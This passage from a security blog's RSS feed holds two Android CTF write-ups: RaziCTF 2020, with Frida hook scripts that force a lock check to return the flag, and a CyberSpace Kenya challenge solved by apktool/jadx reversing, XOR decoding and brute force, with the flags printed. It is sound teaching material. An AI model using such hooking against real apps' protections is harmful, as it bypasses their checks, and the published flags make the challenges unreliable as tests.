  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot4.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Let&amp;rsquo;s look at run method in the switcher class as it&amp;rsquo;s output determines whether the flag is displayed.
In the switcher code we can see the method &lt;code&gt;run&lt;/code&gt;. Instead of trying to figure out what each line does, I saw it easier to just hook into
this method and manipulate the &lt;code&gt;i&lt;/code&gt; value, which at this point I believe is the 20000 value.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot5.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I found two ways to solve this with frida, the run method was actually the one returning the flag:&lt;/p&gt;
&lt;p&gt;First one is to hook into the method and change the input value &lt;code&gt;i&lt;/code&gt; as it gets called.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;perform&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hooking...&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;overload&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;int&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;implementation&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;){
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Original Input: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Original return: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Modified Input: 0&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Modified return: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;;
 };
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When I click on the padlock in the app, the flag is given.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot6.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Second one is to just initialize the switcher object ourselves and call the run method directly with our input without hooking.
This way I don&amp;rsquo;t need to interact with the app.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;perform&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcherInstance&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;$new&lt;/span&gt;();
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Flag: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcherInstance&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot7.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;code&gt;Flag:  RaziCTF{IN_HATE_0F_RUNN!NG_L0CK5}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a good learning experience for me especially the second part which is quicker and has less code.&lt;/p&gt;
&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>CyberSpaceKenya CTF: ZuluMeats3</title>
      <link>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</link>
      <pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</guid>
      <description></description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;I recently worked on a CTF challenge by &lt;a href=&#34;https://twitter.com/CyberSpaceKenya&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CyberSpace Kenya&lt;/a&gt;

 which I ended up winning. This is a writeup on how I solved the challenge. We were provided with an android app to reverse engineer and submit 3 flags.&lt;/p&gt;
&lt;h2 id=&#34;flag-3&#34;&gt;Flag 3&lt;/h2&gt;
&lt;p&gt;I haven&amp;rsquo;t done tons of mobile app reverse engineering but as I was learning about the subject in previous challenges I found this 2-step approach to work well:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extracting the apk contents with apktool&lt;/li&gt;
&lt;li&gt;Reversing the app code with jadx-gui&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using apktool is pretty simple just run this command on the apk:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&amp;gt; apktool d cyberspace-ctf.apk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This generates files in a folder cyberspace-ctf as below:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.
âââ AndroidManifest.xml
âââ apktool.yml
âââ assets
âââ lib
âââ original
âââ res
âââ smali
âââ unknown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Checking the AndroidManifest.xml and res/values/strings.xml doesn&amp;rsquo;t reveal any flag. Usually grepping recursively through the apk files for interesting names would hint at something. After a few tries with the words flag, flag1, flag2, flag3 I got some interesting output.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf1.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Without much thought I opened jadx to find more mentions of that ValidateFlag3 and found the code.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf2.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Reading through the code I was able to figure out that the validate function does the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;takes our input&lt;/li&gt;
&lt;li&gt;xor encrypts it with a key(which is generated by getKey() function)&lt;/li&gt;
&lt;li&gt;base64 encodes it&lt;/li&gt;
&lt;li&gt;checks if it is equal to the hardcoded flag3.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;From previous experience I know that with xor encryption if you have the key and the encrypted data getting the plain text output is simple. Let me illustrate:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;encrypted = key ^ plaintext
plaintext = key ^ encrypted
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Getting the code to work in java isn&amp;rsquo;t as easy so I decided to use python and script the solution.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

key1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hUZAf9gFIARRFTAvKRDs8A==&amp;#34;&lt;/span&gt;
key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gp9jPELztMsd51Ih81gO0Q==&amp;#34;&lt;/span&gt;
flag3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RJ9qOOqa7pAinT19vyuQRHOGSi3FnPW5La0BYb4tnw==&amp;#34;&lt;/span&gt;

data1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(key1)
data2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(key2)
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(data2)):
    key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(data1[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; data2[i])

decodedflag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(flag3)
encryptedFlag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(encryptedFlag)):
    decodedflag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(encryptedFlag[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len(key)])

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [chr(s) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; decodedflag]

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(b))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Flag 3: &lt;code&gt;CFI{plz_no_secret_in_java_code}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Since I found flag3 first I must have missed some stuff.&lt;/p&gt;
&lt;h2 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h2&gt;
&lt;p&gt;Refering back to my earlier screenshot, after performing the grep there&amp;rsquo;s some base64 encoded data which I should have been more keen to look at!&lt;/p&gt;
&lt;p&gt;base64:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Q1NfS0V7YmFzZTY0X2VuY29kaW5nX2lzX25vdF90aGF0X3NlY3VyZX0=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Flag 1: &lt;code&gt;CS_KE{base64_encoding_is_not_that_secure}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h2&gt;
&lt;p&gt;Now flag 2 was the last to find. Since most of the clues we have been finding were in that &lt;code&gt;assets/index.android.bundle&lt;/code&gt; file let me have a look at it.&lt;/p&gt;
&lt;p&gt;&lt;del&gt;Something I noted was that jadx didnât find this file, that why the approach to use two tools is good IMO.&lt;/del&gt; A friend of mine has pointed out that it was actually there under Resources/assets on the jadx ui, nevertheless using two or more tools for analysis is still a good practice IMO. There is a lot of code in this file that is not easily readable, so I just googled what this file is.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf3.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I found that this file contains minified-javascript, it is created when an android app is developed using react. We already saw mentions of react when reading the code in jadx.&lt;/p&gt;
&lt;p&gt;Reading the code in it&amp;rsquo;s minified form isn&amp;rsquo;t easy so js-beautifier to the rescue. I then opened the readable version in vs code and searched for the validateflag function again.&lt;/p&gt;
&lt;p&gt;I landed here and we can clearly see the function that contained the base64 and the the other one that called flag3, due to their order flag 2 is what is left.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf4.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I took the same approach to porting the code to python as it is easier for me to work with. I had to do a bit of googling to understand the js flow but came up with this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(n):
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(n)):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; r:
            t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            t &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; len(n) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
        u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(n[r]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; t
        e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(u))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At the end, the output of the function is checked if it is equal to that list of numbers which is a hex representation of characters. Instead of trying to undo the transformation that was going on in the function where they add 13&amp;hellip; which I tried for a few hours and failed, better to bruteforce all possibilities.&lt;/p&gt;
&lt;p&gt;I came up with this script for that:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string

k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;151&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;146&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;158&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;172&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;158&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;192&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;197&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;176&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;204&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;190&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;210&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;209&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;201&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;206&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;204&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;232&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;228&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;246&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;220&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;253&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;234&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;245&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;258&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;268&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;250&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;262&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;282&lt;/span&gt;]

all &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;printable

a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [a[i] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(a))]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(n):
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(n)):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; r:
            t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            t &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; len(n) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
        u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(n[r]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; t
        e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(u))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; e

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(all)):
        flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; all[j]
        out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f(flag)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; out[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; str(k[i]):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(flag))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Flag 2: &lt;code&gt;CFI{obfuscated_javascript_is_not_secured}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a good ctf for practising some code review. I also had never played around with an app made with react so that was something I learnt.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;d like to thank the CyberSpace Kenya team for putting up the challenge as well as &lt;a href=&#34;https://twitter.com/ZuluMeats&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ZuluMeats&lt;/a&gt;

 for the prize.&lt;/p&gt;
&lt;p&gt;You can find more challenges on their website: &lt;a href=&#34;https://ctf.cyberspace.co.ke&#34;&gt;https://ctf.cyberspace.co.ke&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;For any questions you can reach me on Twitter.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
  </channel>
</rss>
